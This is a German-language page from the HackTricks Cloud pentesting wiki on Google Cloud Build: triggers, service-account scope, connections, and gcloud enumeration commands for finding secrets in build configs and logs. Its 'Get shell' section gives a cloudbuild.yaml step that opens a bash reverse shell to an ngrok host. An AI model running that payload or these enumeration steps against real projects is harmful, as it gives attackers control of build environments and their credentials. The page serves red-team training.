# GCP - Cloud Build Enum

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Grundinformationen

Google Cloud Build ist eine verwaltete CI/CD-Plattform, die **Software-Bau** und Freigabeprozesse automatisiert, sich in **Quellcode-Repositories** integriert und eine breite Palette von Programmiersprachen unterst√ºtzt. Es **erm√∂glicht Entwicklern, Code automatisch zu erstellen, zu testen und bereitzustellen**, w√§hrend es Flexibilit√§t bietet, um Build-Schritte und Workflows anzupassen.

Jeder Cloud Build Trigger ist **mit einem Cloud Repository verbunden oder direkt mit einem externen Repository** (Github, Bitbucket und Gitlab) verbunden.

{% hint style="success" %}
Ich konnte hier oder von Cloud-Repositories aus keine M√∂glichkeit sehen, das Github/Bitbucket-Token zu stehlen, da das Repo heruntergeladen wird und √ºber eine [https://source.cloud.google.com/](https://source.cloud.google.com/) URL zugegriffen wird und Github nicht vom Client aus zugegriffen wird.
{% endhint %}

### Ereignisse

Der Cloud Build kann ausgel√∂st werden, wenn:

* **In einen Branch gepusht wird**: Geben Sie den Branch an
* **Ein neuer Tag gepusht wird**: Geben Sie den Tag an
* **Pull-Request**: Geben Sie den Branch an, der den PR erh√§lt
* **Manuelle Ausf√ºhrung**
* **Pub/Sub-Nachricht:** Geben Sie das Thema an
* **Webhook-Ereignis**: Es wird eine HTTPS-URL bereitgestellt, und die Anfrage muss mit einem Geheimnis authentifiziert werden

### Ausf√ºhrung

Es gibt 3 Optionen:

* Eine yaml/json **, die die auszuf√ºhrenden Befehle angibt**. √úblicherweise: `/cloudbuild.yaml`
* Nur eine, die ‚Äûinline‚Äú in der Web-Konsole und in der CLI angegeben werden kann
* H√§ufigste Option
* Relevant f√ºr nicht authentifizierten Zugriff
* Eine **Dockerfile** zum Erstellen
* Ein **Buildpack** zum Erstellen

### SA-Berechtigungen

Das **Service-Konto hat den `cloud-platform`-Bereich**, sodass es **alle Berechtigungen nutzen kann.** Wenn **kein SA angegeben ist** (wie beim Einreichen), wird das **Standard-SA** `<proj-number>@cloudbuild.gserviceaccount.com` **verwendet.**

Standardm√§√üig werden keine Berechtigungen erteilt, aber es ist ziemlich einfach, einige zu gew√§hren:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Genehmigungen

Es ist m√∂glich, einen Cloud Build so zu konfigurieren, dass **Genehmigungen f√ºr Build-Ausf√ºhrungen erforderlich sind** (standardm√§√üig deaktiviert).

### PR-Genehmigungen

Wenn der Trigger PR ist, weil **jeder PRs zu √∂ffentlichen Repositories durchf√ºhren kann**, w√§re es sehr gef√§hrlich, einfach **die Ausf√ºhrung des Triggers mit jedem PR zuzulassen**. Daher wird die Ausf√ºhrung standardm√§√üig nur **automatisch f√ºr Eigent√ºmer und Mitwirkende** sein, und um den Trigger mit PRs anderer Benutzer auszuf√ºhren, muss ein Eigent√ºmer oder Mitwirkender `/gcbrun` kommentieren.

<figure><img src="../../../.gitbook/assets/image (339).png" alt="" width="563"><figcaption></figcaption></figure>

### Verbindungen & Repositories

Verbindungen k√∂nnen √ºber folgende Wege erstellt werden:

* **GitHub:** Es wird ein OAuth-Prompt angezeigt, der um Berechtigungen bittet, um **ein Github-Token zu erhalten**, das im **Secret Manager** gespeichert wird.
* **GitHub Enterprise:** Es wird aufgefordert, eine **GithubApp** zu installieren. Ein **Authentifizierungstoken** von Ihrem GitHub Enterprise-Host wird erstellt und in diesem Projekt als **Secret Manager**-Geheimnis gespeichert.
* **GitLab / Enterprise:** Sie m√ºssen **das API-Zugriffstoken und das Lese-API-Zugriffstoken** bereitstellen, das im **Secret Manager** gespeichert wird.

Sobald eine Verbindung hergestellt ist, k√∂nnen Sie sie verwenden, um **Repositories zu verkn√ºpfen, auf die das Github-Konto Zugriff hat**.

Diese Option ist √ºber die Schaltfl√§che verf√ºgbar:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Beachten Sie, dass Repositories, die mit dieser Methode verbunden sind, **nur in Triggern der 2. Generation verf√ºgbar sind.**
{% endhint %}

### Ein Repository verbinden

Dies ist nicht dasselbe wie eine **`Verbindung`**. Dies erm√∂glicht **verschiedene** M√∂glichkeiten, um **Zugriff auf ein Github- oder Bitbucket**-Repository zu erhalten, generiert jedoch **kein Verbindungsobjekt, sondern ein Repositoryobjekt (1. Generation).**

Diese Option ist √ºber die Schaltfl√§che verf√ºgbar:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Speicherung

Manchmal wird Cloud Build **einen neuen Speicher generieren, um die Dateien f√ºr den Trigger zu speichern**. Dies geschieht beispielsweise im Beispiel, das GCP mit anbietet:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Ein Storage-Bucket namens [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) wird erstellt, um eine `.tgz` mit den zu verwendenden Dateien zu speichern.

### Get shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Installieren Sie gcloud innerhalb von Cloud Build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

Sie k√∂nnten **sensible Informationen in Build-Konfigurationen und Protokollen** finden.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Privilegieneskalation

{% content-ref url="../gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Unauthentifizierter Zugriff

{% content-ref url="../gcp-unauthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../gcp-unauthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post-Exploitation

{% content-ref url="../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
